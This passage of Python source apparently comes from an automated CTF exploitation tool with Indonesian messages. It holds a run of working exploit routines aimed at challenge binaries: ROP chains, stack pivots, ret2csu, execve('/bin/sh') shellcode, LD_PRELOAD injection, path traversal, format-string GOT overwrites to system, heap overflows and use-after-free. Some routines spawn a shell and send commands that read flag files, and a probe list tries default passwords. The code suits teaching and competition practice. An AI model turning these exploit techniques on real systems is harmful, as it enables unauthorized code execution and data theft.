            stos_gadget = int(questionable) + 0x11
            char_locations: dict[int, int] = {}
            for ch in set(filename):
                hits = [int(addr) for addr in self.target.elf.search(bytes([ch])) if int(addr) > 0x1000]
                if not hits:
                    raise RuntimeError(f"byte {ch:#x} tidak ditemukan untuk xlat")
                char_locations[ch] = hits[0]

            current_al = 0x0B
            chain = b""
            for idx, ch in enumerate(filename):
                source_addr = char_locations[ch]
                chain += (
                    self.pack_addr(bextr_gadget)
                    + self.pack_addr(0x4000)
                    + self.pack_addr(source_addr - current_al - 0x3EF2)
                    + self.pack_addr(xlat_gadget)
                    + self.pack_addr(int(pop_arg.address))
                    + self.pack_addr(writable + idx)
                    + self.pack_addr(stos_gadget)
                )
                current_al = ch
            chain += self.pack_addr(int(pop_arg.address)) + self.pack_addr(writable) + self.pack_addr(int(print_file))
            ret = rop.find_gadget(["ret"])
            chains.append(chain)
            if ret:
                chains.insert(0, self.pack_addr(int(ret.address)) + chain)
        else:
            def bswap32(value: int) -> int:
                return int.from_bytes(p32(value), "big")

            def pext_mask_for(byte: int) -> int:
                source = 0xB0BABABA
                positions_by_bit = {
                    bit: [idx for idx in range(32) if ((source >> idx) & 1) == bit]
                    for bit in (0, 1)
                }

                chosen: list[int] = []

                def backtrack(bit_idx: int, after: int) -> bool:
                    if bit_idx == 8:
                        return True
                    want = (byte >> bit_idx) & 1
                    for pos in positions_by_bit[want]:
                        if pos <= after:
                            continue
                        chosen.append(pos)
                        if backtrack(bit_idx + 1, pos):
                            return True
                        chosen.pop()
                    return False

                if not backtrack(0, -1):
                    raise RuntimeError(f"mask pext untuk byte {byte:#x} tidak ditemukan")
                mask = 0
                for pos in chosen:
                    mask |= 1 << pos
                return mask

            pop_all = rop.find_gadget(["pop ebx", "pop esi", "pop edi", "pop ebp", "ret"])
            if not pop_all:
                raise RuntimeError("pop ebx/esi/edi/ebp; ret tidak ditemukan")
            pext_gadget = int(questionable)
            xchg_gadget = int(questionable) + 0x12
            pop_ecx_bswap = int(questionable) + 0x15
            chain = b""
            for idx, ch in enumerate(filename):
                chain += (
                    self.pack_addr(int(pop_all.address))
                    + self.pack_addr(0)
                    + self.pack_addr(0)
                    + self.pack_addr(0)
                    + self.pack_addr(pext_mask_for(ch))
                    + self.pack_addr(pext_gadget)
                    + self.pack_addr(pop_ecx_bswap)
                    + self.pack_addr(bswap32(writable + idx))
                    + self.pack_addr(xchg_gadget)
                )
            chain += self.pack_addr(int(print_file)) + self.pack_addr(0) + self.pack_addr(writable)
            chains.append(chain)

        step = 4 if self.target.elf.bits == 32 else 8
        for offset in range(step, 400, step):
            for chain in chains:
                payload = b"A" * offset + chain + b"\n"
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.5)
                p.send(payload)
                out = self.drain_available(p, timeout=2.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="fluff gadgets synthesize flag filename",
                        success=True,
                        confidence=84,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="ROP uses non-trivial byte-write gadgets to build a flag filename before print_file",
                        offset=offset,
                        notes=[f"print_file={hex(int(print_file))}", f"dst={hex(writable)}"],
                    )
        return ExploitResult(
            strategy="fluff gadgets synthesize flag filename",
            success=False,
            confidence=25,
            vuln="ROP uses non-trivial byte-write gadgets to build a flag filename before print_file",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_pivot_ret2win(self) -> ExploitResult:
        foothold_plt = self.target.elf.plt.get("foothold_function")
        foothold_got = self.target.elf.got.get("foothold_function")
        useful = self.target.elf.symbols.get("usefulGadgets")
        if not foothold_plt or not foothold_got or not useful:
            raise RuntimeError("foothold_function/usefulGadgets tidak lengkap")

        delta = None
        lib_name = None
        for candidate in sorted(self.target.cwd.glob("*.so")):
            try:
                lib = ELF(str(candidate), checksec=False)
            except Exception:
                continue
            if lib.bits != self.target.elf.bits:
                continue
            if "foothold_function" in lib.symbols and "ret2win" in lib.symbols:
                delta = int(lib.symbols["ret2win"]) - int(lib.symbols["foothold_function"])
                lib_name = candidate.name
                break
        if delta is None:
            raise RuntimeError("library dengan foothold_function/ret2win tidak ditemukan")

        rop = ROP(self.target.elf)
        if self.target.elf.bits == 64:
            pop_acc = rop.find_gadget(["pop rax", "ret"])
            pop_delta = rop.find_gadget(["pop rbp", "ret"])
            if not pop_acc or not pop_delta:
                raise RuntimeError("pop rax/pop rbp gadget tidak ditemukan")
            xchg_pivot = int(useful) + 0x2
            mov_acc_ptr = int(useful) + 0x5
            add_acc_delta = int(useful) + 0x9
            call_acc = 0x4006B0
            stage1 = (
                self.pack_addr(int(foothold_plt))
                + self.pack_addr(int(pop_acc.address))
                + self.pack_addr(int(foothold_got))
                + self.pack_addr(mov_acc_ptr)
                + self.pack_addr(int(pop_delta.address))
                + self.pack_addr(delta)
                + self.pack_addr(add_acc_delta)
                + self.pack_addr(call_acc)
            )
            offsets = range(32, 57, 8)
        else:
            pop_acc = rop.find_gadget(["pop eax", "ret"])
            pop_delta = rop.find_gadget(["pop ebx", "ret"])
            if not pop_acc or not pop_delta:
                raise RuntimeError("pop eax/pop ebx gadget tidak ditemukan")
            xchg_pivot = int(useful) + 0x2
            mov_acc_ptr = int(useful) + 0x4
            add_acc_delta = int(useful) + 0x7
            call_acc = 0x80485F0
            stage1 = (
                self.pack_addr(int(foothold_plt))
                + self.pack_addr(int(pop_acc.address))
                + self.pack_addr(int(foothold_got))
                + self.pack_addr(mov_acc_ptr)
                + self.pack_addr(int(pop_delta.address))
                + self.pack_addr(delta)
                + self.pack_addr(add_acc_delta)
                + self.pack_addr(call_acc)
            )
            offsets = range(36, 53, 4)

        for offset in offsets:
            p = self.start()
            init = self.recv_until_any_prompt(p, [b"> "], timeout=1.5)
            match = re.search(rb"0x[0-9a-fA-F]+", init)
            if not match:
                p.close()
                continue
            pivot_addr = int(match.group(0), 16)
            p.send(stage1 + b"\n")
            mid = self.recv_until_any_prompt(p, [b"> "], timeout=1.5)
            stage2 = b"A" * offset + self.pack_addr(int(pop_acc.address)) + self.pack_addr(pivot_addr) + self.pack_addr(xchg_pivot) + b"\n"
            p.send(stage2)
            out = init + mid + self.drain_available(p, timeout=3.0)
            p.close()
            flag = extract_flag(out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="pivot ret2win via foothold GOT",
                    success=True,
                    confidence=88,
                    output=out,
                    flag=flag,
                    payload=stage1 + b"\n" + stage2,
                    vuln="Stack pivot to attacker-controlled heap ROP, then ret2win resolved from library delta",
                    offset=offset,
                    notes=[
                        f"pivot={hex(pivot_addr)}",
                        f"foothold_got={hex(int(foothold_got))}",
                        f"delta={hex(delta)}",
                        f"lib={lib_name}",
                    ],
                )
        return ExploitResult(
            strategy="pivot ret2win via foothold GOT",
            success=False,
            confidence=25,
            vuln="Stack pivot to attacker-controlled heap ROP, then ret2win resolved from library delta",
            notes=["Pivot offset sweep tidak menghasilkan flag."],
        )

    def exploit_ret2csu_full_args(self) -> ExploitResult:
        if self.target.elf.bits != 64:
            raise RuntimeError("ret2csu strategy hanya untuk amd64")
        csu = self.target.elf.symbols.get("__libc_csu_init")
        ret2win = self.target.elf.plt.get("ret2win") or self.target.elf.symbols.get("ret2win")
        fini = self.target.elf.symbols.get("_fini")
        if not csu or not ret2win or not fini:
            raise RuntimeError("__libc_csu_init/ret2win/_fini tidak lengkap")

        rop = ROP(self.target.elf)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])
        pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"])
        if not pop_rdi or not pop_rsi:
            raise RuntimeError("pop rdi atau pop rsi; pop r15 tidak ditemukan")

        fini_ptr = None
        for addr in self.target.elf.search(p64(int(fini))):
            if addr >= self.target.elf.address:
                fini_ptr = int(addr)
                break
        if not fini_ptr:
            raise RuntimeError("pointer _fini tidak ditemukan di image ELF")

        csu_pop = int(csu) + 0x5A
        csu_call = int(csu) + 0x40
        arg1 = 0xDEADBEEFDEADBEEF
        arg2 = 0xCAFEBABECAFEBABE
        arg3 = 0xD00DF00DD00DF00D
        chain = (
            p64(csu_pop)
            + p64(0)
            + p64(1)
            + p64(fini_ptr)
            + p64(0)
            + p64(0)
            + p64(arg3)
            + p64(csu_call)
            + p64(0)
            + p64(0)
            + p64(0)
            + p64(0)
            + p64(0)
            + p64(0)
            + p64(0)
            + p64(int(pop_rdi.address))
            + p64(arg1)
            + p64(int(pop_rsi.address))
            + p64(arg2)
            + p64(0)
            + p64(int(ret2win))
        )
        ret = rop.find_gadget(["ret"])
        chains = [chain]
        if ret:
            chains.insert(0, p64(int(ret.address)) + chain)

        for offset in range(32, 73, 8):
            for candidate in chains:
                payload = b"A" * offset + candidate + b"\n"
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.5)
                p.send(payload)
                out = self.drain_available(p, timeout=3.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="ret2csu full-argument ret2win",
                        success=True,
                        confidence=86,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="__libc_csu_init sets rdx through a benign call, then ret2win receives full magic args",
                        offset=offset,
                        notes=[f"csu={hex(int(csu))}", f"fini_ptr={hex(fini_ptr)}", f"ret2win={hex(int(ret2win))}"],
                    )
        return ExploitResult(
            strategy="ret2csu full-argument ret2win",
            success=False,
            confidence=25,
            vuln="__libc_csu_init sets rdx through a benign call, then ret2win receives full magic args",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def i386_execve_sh_shellcode(self) -> bytes:
        context.clear(arch="i386", os="linux")
        context.log_level = "error"
        return asm(
            """
            xor eax, eax
            push eax
            push 0x68732f2f
            push 0x6e69622f
            mov ebx, esp
            push eax
            push ebx
            mov ecx, esp
            xor edx, edx
            mov al, 0xb
            int 0x80
            """
        )

    def start_leak_address(self) -> int | None:
        needle = b"\x89\xe1\xb2\x14\xb3\x01\xb0\x04\xcd\x80"
        hits = list(self.target.elf.search(needle))
        if hits:
            return int(hits[0])
        if "_start" in self.target.elf.symbols:
            return int(self.target.elf.symbols["_start"]) + 0x27
        return None

    def run_i386_start_shellcode_attack(self, tube, strategy: str) -> ExploitResult:
        if self.target.elf.bits != 32 or self.target.elf.nx:
            raise RuntimeError("target bukan i386 execstack/NX disabled")
        leak_addr = self.start_leak_address()
        if not leak_addr:
            raise RuntimeError("alamat leak esp tidak ditemukan")
        sc = self.i386_execve_sh_shellcode()
        if 20 + 4 + len(sc) > 60:
            raise RuntimeError(f"shellcode terlalu panjang untuk read 0x3c: {len(sc)}")

        output = self.recv_until_any_prompt(tube, [b":", b">", b"\n"], timeout=1.0)
        tube.send(b"A" * 20 + p32(leak_addr))
        leak = b""
        try:
            leak = tube.recvn(4, timeout=1.0)
        except Exception:
            leak = tube.recv(timeout=1.0)
        output += leak
        if len(leak) < 4:
            raise RuntimeError("leak esp kurang dari 4 byte")
        esp = struct.unpack("<I", leak[:4])[0]
        try:
            output += tube.recv(timeout=0.2)
        except Exception:
            pass
        stage2 = b"A" * 20 + p32(esp + 20) + sc
        tube.send(stage2)
        time.sleep(0.15)
        tube.send(b"cat flag.txt; cat ./flag.txt; cat flag; cat /home/*/flag; cat /flag.txt; exit\n")
        try:
            output += tube.recvall(timeout=3.0)
        finally:
            try:
                tube.close()
            except Exception:
                pass
        flag = extract_flag(output, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=84 if flag else 30,
            output=output,
            flag=flag,
            payload=b"<dynamic i386 start shellcode leak>",
            vuln="Two-stage stack leak to execve('/bin/sh') shellcode",
            offset=20,
            notes=[f"leak_addr={hex(leak_addr)}", f"esp={hex(esp)}", f"shellcode_len={len(sc)}"],
        )

    def exploit_i386_start_shellcode(self) -> ExploitResult:
        p = self.start()
        return self.run_i386_start_shellcode_attack(p, "i386 start shellcode leak")

    def i386_orw_shellcode(self, path: str) -> bytes:
        context.clear(arch="i386", os="linux")
        context.log_level = "error"
        return asm(
            shellcraft.open(path, 0)
            + shellcraft.read("eax", "esp", 0x100)
            + shellcraft.write(1, "esp", "eax")
            + shellcraft.exit(0)
        )

    def orw_flag_paths(self) -> list[str]:
        paths = ["flag.txt", "flag", "/home/orw/flag", "/flag.txt"]
        for name in sorted(self.discover_flag_filenames()):
            base = Path(name).name
            if base and base not in paths:
                paths.insert(0, base)
        unique: list[str] = []
        for path in paths:
            if path not in unique:
                unique.append(path)
        return unique

    def run_i386_orw_shellcode_attack(self, tube, path: str, strategy: str) -> ExploitResult:
        if self.target.elf.bits != 32:
            raise RuntimeError("ORW shellcode strategy hanya untuk i386")
        sc = self.i386_orw_shellcode(path)
        output = self.recv_until_any_prompt(tube, [b"shellcode", b":", b">", b"\n"], timeout=1.0)
        tube.send(sc)
        try:
            tube.shutdown("send")
        except Exception:
            pass
        try:
            output += tube.recvall(timeout=2.5)
        finally:
            try:
                tube.close()
            except Exception:
                pass
        flag = extract_flag(output, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=82 if flag else 30,
            output=output,
            flag=flag,
            payload=sc,
            vuln="Injected i386 open/read/write shellcode reads a flag file",
            notes=[f"path={path}", f"shellcode_len={len(sc)}"],
        )

    def exploit_i386_orw_shellcode(self) -> ExploitResult:
        if not any(re.search(r"shellcode|orw|Give my your shellcode", s, re.I) for s in self.recon.get("strings", [])):
            raise RuntimeError("prompt/symbol ORW shellcode tidak cocok")
        attempts: list[str] = []
        for path in self.orw_flag_paths():
            p = self.start_read_implies_exec()
            result = self.run_i386_orw_shellcode_attack(p, path, "i386 ORW shellcode")
            if result.success and result.flag:
                return result
            attempts.append(path)
        return ExploitResult(
            strategy="i386 ORW shellcode",
            success=False,
            confidence=25,
            vuln="Injected i386 open/read/write shellcode reads a flag file",
            notes=[f"Path attempts did not return a flag: {', '.join(attempts)}"],
        )

    def exploit_env_ld_preload_duplicate(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if "waiting for new environment" not in hay:
            raise RuntimeError("prompt environment tidak cocok")
        source_candidates: list[Path] = []
        if self.target.source and self.target.source.exists():
            source_candidates.append(self.target.source)
        source_candidates.extend(sorted(self.target.cwd.glob("*.c")))
        preload_source = None
        for candidate in source_candidates:
            try:
                src = candidate.read_text(encoding="utf-8", errors="replace")
            except Exception:
                continue
            if re.search(r"\bgetuid\s*\(", src) and re.search(r"\bopen\s*\(\s*\"flag", src):
                preload_source = candidate
                break
        if not preload_source:
            raise RuntimeError("source LD_PRELOAD getuid flag payload tidak ditemukan")

        out_dir = self.target.cwd / ".silverpwn_build"
        out_dir.mkdir(exist_ok=True)
        so_path = out_dir / "env_payload.so"
        rel_so = "./.silverpwn_build/env_payload.so"
        cp = subprocess.run(
            ["gcc", "-shared", "-fPIC", str(preload_source), "-o", str(so_path)],
            cwd=str(self.target.cwd),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=10,
        )
        if cp.returncode != 0:
            raise RuntimeError("compile LD_PRELOAD payload gagal: " + cp.stdout[:200])

        payload = f"LD_PRELOAD={rel_so}\nLD_PRELOAD={rel_so}\n\n".encode()
        p = self.start()
        banner = self.recv_until_any_prompt(p, [b"environment", b"\n"], timeout=1.0)
        p.send(payload)
        out = banner + self.drain_available(p, timeout=2.5)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="duplicate LD_PRELOAD environment bypass",
            success=flag is not None,
            confidence=78 if flag else 30,
            output=out,
            flag=flag,
            payload=payload,
            vuln="Duplicate unsafe environment entries survive filtering and preload a flag-reading shared object",
            notes=[f"shared_object={so_path.name}", f"source={preload_source.name}"],
        )

    def exploit_menu_file_read_traversal(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not (("patchnotes/" in hay or "patch notes" in hay.lower()) and "Which patchnotes" in hay):
            raise RuntimeError("menu patchnotes/path traversal tidak cocok")
        try:
            (self.target.cwd / "patchnotes").mkdir(exist_ok=True)
        except Exception:
            pass
        attempts = [b"../flag\n", b"../flag.txt\n", b"flag\n", b"flag.txt\n"]
        for filename in attempts:
            p = self.start()
            banner = self.recv_until_any_prompt(p, [b"Quit", b"3)", b"Interface"], timeout=1.0)
            p.send(b"2\n")
            prompt = self.recv_until_any_prompt(p, [b"shown?", b"patchnotes"], timeout=1.0)
            p.send(filename)
            out = banner + prompt + self.drain_available(p, timeout=1.5)
            p.close()
            flag = extract_flag(out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="menu path traversal file read",
                    success=True,
                    confidence=80,
                    output=out,
                    flag=flag,
                    payload=b"2\n" + filename,
                    vuln="Menu file reader prefixes a directory but accepts traversal",
                    notes=[f"path={filename.strip().decode('latin-1')}"],
                )
        return ExploitResult(
            strategy="menu path traversal file read",
            success=False,
            confidence=25,
            vuln="Menu file reader prefixes a directory but accepts traversal",
            notes=["Traversal path attempts did not return a flag."],
        )

    def generic_probe_payloads(self) -> list[bytes]:
        payloads: list[bytes] = [
            b"\n",
            b"0\n",
            b"1\n",
            b"-1\n",
            b"65\n",
            b"yes\n",
            b"y\n",
            b"no\n",
            b"admin\n",
            b"root\n",
            b"password\n",
            b"letmein\n",
            b"admin\nadmin\n",
            b"admin\npassword\n",
            b"1\n1\n",
            b"1\n0\n",
            b"2\n0\n",
            b"3\n",
            b"2147483647\n1\n",
            b"4294967295\n1\n",
        ]
        for size in (8, 16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 112, 128, 160, 192, 224, 256, 384, 512):
            payloads.append(b"A" * size + b"\n")
            payloads.append(b"A" * size + b"\x01\n")
        if any(re.search(r"admin|pass|auth|check|verify", s, re.I) for s in self.recon.get("strings", [])):
            for size in (16, 24, 32, 40, 48, 64, 80, 128):
                payloads.append(b"A" * size + b"\x01" + b"\n")
                payloads.append(b"A" * size + b"admin\n")
        unique: list[bytes] = []
        seen: set[bytes] = set()
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique.append(payload)
        return unique

    def exploit_generic_input_fuzzer(self) -> ExploitResult:
        attempts = 0
        for payload in self.generic_probe_payloads():
            attempts += 1
            p = self.start()
            banner = self.recv_until_any_prompt(p, [b": ", b"> ", b"? ", b"\n"], timeout=0.25)
            p.send(payload)
            try:
                out = p.recvall(timeout=0.3)
            finally:
                try:
                    p.close()
                except Exception:
                    pass
            flag = extract_flag(banner + out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="Generic input probe",
                    success=True,
                    confidence=65,
                    output=banner + out,
                    flag=flag,
                    payload=payload,
                    vuln="Replayable input reaches flag path",
                    notes=[f"attempts={attempts}", f"payload_len={len(payload)}"],
                )
        return ExploitResult(
            strategy="Generic input probe",
            success=False,
            confidence=15,
            notes=[f"{attempts} replayable input probes did not expose a flag."],
            vuln="Input-driven flag path",
        )

    def exploit_pico_ret2win_args(self) -> ExploitResult:
        if self.target.elf.bits != 32 or "win" not in self.target.elf.symbols:
            raise RuntimeError("ret2win args pattern membutuhkan i386 win()")
        win = int(self.target.elf.symbols["win"])
        for offset in range(80, 160, 4):
            p = self.start()
            self.recv_until_any_prompt(p, [b": ", b":\n", b"\n"], timeout=0.5)
            payload = b"A" * offset + p32(win) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D) + b"\n"
            p.send(payload)
            out = p.recvall(timeout=1.0)
            p.close()
            flag = extract_flag(out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="ret2win with i386 arguments",
                    success=True,
                    confidence=86,
                    output=out,
                    flag=flag,
                    payload=payload,
                    vuln="Stack overflow calls win(arg1,arg2)",
                    offset=offset,
                    notes=["arg1=0xCAFEF00D", "arg2=0xF00DF00D"],
                )
        return ExploitResult("ret2win with i386 arguments", False, 30, vuln="Stack overflow calls win(arg1,arg2)", notes=["Tidak menemukan offset argumen yang valid."])

    def exploit_pico_picker_jump(self) -> ExploitResult:
        if "win" not in self.target.elf.symbols:
            raise RuntimeError("symbol win tidak ada")
        p = self.start()
        self.recv_until_any_prompt(p, [b"excluding '0x': ", b": "], timeout=1.0)
        win = int(self.target.elf.symbols["win"])
        payload = f"{win:x}\n".encode()
        return self.finalize(p, payload, "Function pointer hex jump", 96, "User-controlled function pointer target", None, [f"win={hex(win)}"])

    def exploit_pico_local_target(self) -> ExploitResult:
        for offset in range(16, 40):
            p = self.start()
            self.recv_until_any_prompt(p, [b"Enter a string: ", b": "], timeout=1.0)
            payload = b"A" * offset + b"A\n"
            p.send(payload)
            out = p.recvall(timeout=1.0)
            p.close()
            flag = extract_flag(out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="Variable overwrite",
                    success=True,
                    confidence=88,
                    output=out,
                    flag=flag,
                    payload=payload,
                    vuln="Stack overflow flips adjacent integer from 64 to 65",
                    offset=offset,
                )
        return ExploitResult("Variable overwrite", False, 30, vuln="Adjacent stack variable overwrite", notes=["Tidak menemukan offset num==65."])

    def exploit_pico_segv_flag(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"Input: ", b": "], timeout=1.0)
        payload = b"A" * 240 + b"\n"
        return self.finalize(p, payload, "SIGSEGV handler flag leak", 88, "Crash path invokes signal handler that prints flag", None)

    def exploit_pico_format0(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"Enter your recommendation: "], timeout=1.0)
        payload = b"Gr%114d_Cheese\nCla%sic_Che%s%steak\n"
        return self.finalize(p, payload, "Format string menu crash", 92, "Allowed menu string abuses printf and SIGSEGV flag handler", None)

    def decode_little_endian_stack_strings(self, output: bytes) -> bytes:
        chunks: list[bytes] = []
        width = 4 if self.target.elf.bits == 32 else 8
        tokens = re.findall(rb"0x[0-9a-fA-F]+|(?<![A-Za-z0-9])[0-9a-fA-F]{6,16}(?![A-Za-z0-9])", output)
        for token in tokens:
            if token.startswith(b"0x"):
                token = token[2:]
            value = int(token, 16)
            chunks.append(value.to_bytes(width, "little", signed=False))
        return b"".join(chunks).replace(b"\x00", b"")

    def exploit_pico_format_stack_leak(self) -> ExploitResult:
        all_output = b""
        best_payload = b""
        spec = "llx" if self.target.elf.bits == 64 else "x"
        for start in range(1, 161, 8):
            p = self.start()
            init = self.recv_until_any_prompt(p, [b":\n", b": ", b">> "], timeout=1.0)
            if b"file not found" in init:
                p.close()
                return ExploitResult("Stack format leak", False, 20, output=init, vuln="Format string stack disclosure", notes=["File pendukung/flag lokal belum ada."])
            payload = b".".join(f"%{idx}${spec}".encode() for idx in range(start, start + 16)) + b"\n"
            best_payload = payload
            p.send(payload)
            out = p.recvall(timeout=1.0)
            p.close()
            decoded = self.decode_little_endian_stack_strings(out)
            combined = out + b"\n[decoded]\n" + decoded
            all_output += combined + b"\n"
            flag = extract_flag(combined, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="Stack format leak",
                    success=True,
                    confidence=82,
                    output=combined,
                    flag=flag,
                    payload=payload,
                    vuln="printf(buf) leaks stack-resident flag",
                    notes=[f"window={start}-{start + 15}", "Hex stack words decoded little-endian."],
                )
        flag = extract_flag(all_output, self.args.flag)
        return ExploitResult(
            strategy="Stack format leak",
            success=flag is not None,
            confidence=82 if flag else 35,
            output=all_output,
            flag=flag,
            payload=best_payload,
            vuln="printf(buf) leaks stack-resident flag",
            notes=["Windowed positional scan completed."],
        )

    def exploit_pico_format_sus_write(self) -> ExploitResult:
        if "sus" not in self.target.elf.symbols:
            raise RuntimeError("symbol sus tidak ada")
        sus = int(self.target.elf.symbols["sus"])
        base = self.detect_fmt_base(prompt=b"say?\n")
        writes = [(sus, 0x6C66), (sus + 2, 0x6761)]
        payload = self.fmt_write_halfwords_payload(base, writes) + b"\n"
        p = self.start()
        self.recv_until_any_prompt(p, [b"say?\n", b": "], timeout=1.0)
        return self.finalize(p, payload, "Format string global write", 86, "Two %hn writes change sus to 0x67616c66", None, [f"sus={hex(sus)}", f"fmt_base={base}"])

    def resolve_libc_elf(self) -> ELF | None:
        candidates: list[Path] = []
        if self.args.libc:
            candidates.append(Path(self.args.libc).expanduser().resolve())
        candidates.append(self.target.cwd / "libc.so.6")
        ldd = run_cmd(["ldd", str(self.target.binary)], cwd=self.target.cwd, timeout=6)
        for match in re.findall(r"=>\s+(\S*libc\.so[^\s]*)", ldd):
            candidates.append(Path(match))
        for candidate in candidates:
            try:
                if candidate.exists():
                    return ELF(str(candidate), checksec=False)
            except Exception:
                continue
        return None

    def exploit_pico_format3_system(self) -> ExploitResult:
        libc = self.resolve_libc_elf()
        if not libc:
            raise RuntimeError("libc resolver tidak menemukan libc")
        if "puts" not in self.target.elf.got:
            raise RuntimeError("puts@GOT tidak ditemukan")
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"libc: "], timeout=1.0)
        # The program waits for fgets immediately after printing the setvbuf leak.
        if b"setvbuf" not in init:
            init += self.recv_until_any_prompt(p, [b"\n"], timeout=1.0)
        leak_match = re.search(rb"setvbuf in libc: (0x[0-9a-fA-F]+)", init)
        if not leak_match:
            p.close()
            raise RuntimeError("setvbuf leak tidak ditemukan")
        setvbuf_leak = int(leak_match.group(1), 16)
        libc_base = setvbuf_leak - int(libc.symbols["setvbuf"])
        system_addr = libc_base + int(libc.symbols["system"])
        puts_got = int(self.target.elf.got["puts"])
        base = self.detect_fmt_base(prompt=b"libc: ")
        writes = [(puts_got + 2 * i, (system_addr >> (16 * i)) & 0xFFFF) for i in range(4)]
        payload = self.fmt_write_halfwords_payload(base, writes) + b"\n"
        p.send(payload)
        # puts("/bin/sh") becomes system("/bin/sh").  Feed a safe local flag read
        # command once the shell is spawned.
        p.send(b"cat flag.txt\nexit\n")
        out = p.recvall(timeout=3.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Format string GOT overwrite to system",
            success=flag is not None,
            confidence=78 if flag else 35,
            output=out,
            flag=flag,
            payload=payload,
            vuln="Libc leak + format string write overwrites puts@GOT",
            notes=[
                f"setvbuf={hex(setvbuf_leak)}",
                f"libc_base={hex(libc_base)}",
                f"system={hex(system_addr)}",
                f"puts@got={hex(puts_got)}",
                f"fmt_base={base}",
            ],
        )

    def exploit_pico_heap_safevar(self) -> ExploitResult:
        source_text = ""
        if self.target.source and self.target.source.exists():
            source_text = self.target.source.read_text(encoding="utf-8", errors="replace")
        desired = b"pico" if '!strcmp(safe_var, "pico")' in source_text else b"AAAA"
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        heap_dump = init
        if b"Address" not in heap_dump:
            p.send(b"1\n")
            heap_dump += self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        addrs = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", heap_dump)]
        if len(addrs) < 2:
            p.close()
            raise RuntimeError("heap addresses tidak ditemukan")
        offset = addrs[1] - addrs[0]
        payload_data = b"A" * offset + desired
        p.send(b"2\n")
        self.recv_until_any_prompt(p, [b"Data for buffer: "], timeout=1.0)
        p.send(payload_data + b"\n")
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"4\n")
        out = p.recvall(timeout=1.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Heap safe_var overwrite",
            success=flag is not None,
            confidence=86 if flag else 35,
            output=out,
            flag=flag,
            payload=b"<menu: write overflow then print flag>",
            vuln="Heap overflow modifies adjacent safe_var",
            offset=offset,
            notes=[f"desired={desired!r}"],
        )

    def exploit_pico_heap_funcptr(self) -> ExploitResult:
        if "win" not in self.target.elf.symbols:
            raise RuntimeError("symbol win tidak ada")
        p = self.start()
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"1\n")
        heap_dump = self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        addrs = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", heap_dump)]
        if len(addrs) < 2:
            p.close()
            raise RuntimeError("heap addresses tidak ditemukan")
        offset = addrs[1] - addrs[0]
        win = int(self.target.elf.symbols["win"])
        p.send(b"2\n")
        self.recv_until_any_prompt(p, [b"Data for buffer: "], timeout=1.0)
        p.send(b"A" * offset + p32(win) + b"\n")
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"4\n")
        out = p.recvall(timeout=1.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Heap function-pointer overwrite",
            success=flag is not None,
            confidence=84 if flag else 35,
            output=out,
            flag=flag,
            payload=b"<menu: write win pointer then call>",
            vuln="Heap overflow changes function pointer payload",
            offset=offset,
            notes=[f"win={hex(win)}"],
        )

    def exploit_pico_heap3_uaf(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"5\n")
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"2\n35\n" + b"A" * 30 + b"pico\n")
        self.recv_until_any_prompt(p, [b"Enter your choice: "], timeout=1.0)
        p.send(b"4\n")
        out = p.recvall(timeout=1.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Heap UAF reallocation",
            success=flag is not None,
            confidence=82 if flag else 35,
            output=out,
            flag=flag,
            payload=b"<menu: free x, realloc object-sized chunk, set flag>",
            vuln="Use-after-free lets attacker rewrite x->flag",
            offset=30,
        )

    def exploit_pico_two_sum(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"possible: \n", b": "], timeout=1.0)
        payload = b"2147483647\n1\n"
        return self.finalize(p, payload, "Signed integer overflow", 96, "Positive int addition overflows negative", None)

